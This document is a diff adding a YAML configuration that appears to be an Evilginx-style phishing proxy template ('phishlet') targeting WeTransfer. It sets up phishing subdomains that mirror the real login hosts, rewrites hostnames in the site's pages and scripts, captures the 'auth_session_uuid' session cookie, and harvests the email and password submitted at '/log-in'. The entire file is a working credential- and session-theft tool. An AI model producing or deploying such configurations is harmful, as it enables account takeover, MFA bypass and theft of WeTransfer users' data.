@@ -1,0 +1,40 @@
+author: '@XC'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'wetransfer.com', session: true, is_landing: true}
+  - {phish_sub: 'auth', orig_sub: 'auth', domain: 'wetransfer.com', session: false, is_landing: false}
+  - {phish_sub: 'portals', orig_sub: 'portals', domain: 'wetransfer.com', session: false, is_landing: false}
+  - {phish_sub: 'wepresents', orig_sub: 'wepresents', domain: 'wetransfer.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'www', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'auth', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'portals', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.wetransfer.com', orig_sub: 'wepresents', domain: 'wetransfer.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+auth_tokens:
+  - domain: '.wetransfer.com'
+    keys: ['auth_session_uuid']
+    
+auth_urls:
+  - '/account/callback'
+  
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+    
+    
+login:
+  domain: 'www.wetransfer.com'
+  path: '/log-in'
